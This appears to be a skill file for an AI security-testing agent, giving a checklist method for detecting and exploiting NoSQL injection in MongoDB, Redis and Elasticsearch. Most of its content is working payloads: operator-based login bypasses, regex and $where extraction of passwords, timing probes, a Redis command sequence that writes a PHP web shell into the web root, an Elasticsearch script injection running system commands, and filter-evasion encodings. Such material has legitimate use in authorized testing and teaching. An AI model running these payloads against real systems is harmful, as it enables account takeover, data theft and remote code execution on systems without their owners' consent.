---
name: nosql-injection
description: Detect and exploit NoSQL injection in MongoDB, Redis, CouchDB, and Elasticsearch
origin: AI Threat Hunting
---

# NoSQL Injection Testing

## When to Activate

- Application uses MongoDB, CouchDB, Redis, or Elasticsearch as a data store
- Parameters may reach NoSQL queries via operator injection or JavaScript execution
- Login forms, search features, or API filters backed by document databases

## Tools

- `curl` (manual injection probing and payload delivery)
- OOB callback server (operator-provisioned for blind confirmation)
- Browser DevTools (observe JSON request bodies and responses)

## Methodology

### 1. Identify Injection Points
- [ ] Test both JSON body and URL-encoded parameter formats
- [ ] Check query parameters, POST bodies, cookies, and headers
- [ ] Look for MongoDB-style error messages (`MongoServerError`, `$operator`, `BSONObj`)

### 2. MongoDB Operator Injection
- [ ] Auth bypass via operator injection
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": {"$exists": true}, "password": {"$exists": true}}
```
- [ ] Array injection in URL-encoded form
```
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username=admin&password[$regex]=.*
```
- [ ] Regex-based data extraction
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```
- [ ] Binary search character-by-character to extract full values

### 3. JavaScript Injection via $where
- [ ] Basic tautology
```json
{"$where": "1==1"}
{"$where": "this.username == 'admin'"}
```
- [ ] Data exfiltration
```json
{"$where": "this.password.match(/^a/) ? true : false"}
```
- [ ] Blind timing injection
```json
{"$where": "sleep(5000) || true"}
{"$where": "function(){sleep(5000);return true;}"}
```

### 4. Aggregation Pipeline Injection
- [ ] Test `$lookup`, `$merge`, `$out` for cross-collection access
```json
[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}]
```

### 5. Redis Command Injection
- [ ] Via SSRF or direct parameter injection
```
\r\nCONFIG SET dir /var/www/html\r\n
\r\nCONFIG SET dbfilename shell.php\r\n
\r\nSET payload "<?php system($_GET['cmd']);?>"\r\n
\r\nSAVE\r\n
```

### 6. Elasticsearch Query DSL Injection
- [ ] Script injection in search queries
```json
{"query": {"bool": {"must": [{"script": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}]}}}
```
- [ ] Wildcard and regex abuse for data extraction
```json
{"query": {"regexp": {"password": {"value": "a.*"}}}}
```

### 7. WAF / Filter Bypass
- [ ] Unicode encoding of operators: `\u0024ne` for `$ne`
- [ ] Nested objects: `{"username": {"$ne": null}}` vs flat params
- [ ] Mixed Content-Type: send JSON body with `application/x-www-form-urlencoded` header
- [ ] Double encoding: `%2524ne` for `$ne`

## What to Record

- Injection point (URL, parameter, method, Content-Type)
- Payload that triggered the vulnerability
- Evidence of bypass or data extraction (auth bypass screenshot, extracted data)
- Backend database type and version if disclosed
- Full request/response for reproducibility

## Extended Resources

- `agent/references/payloads/nosql-injection-payloads.md` — MongoDB operators ($gt, $ne, $regex, $where), auth bypass, blind extraction
- `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
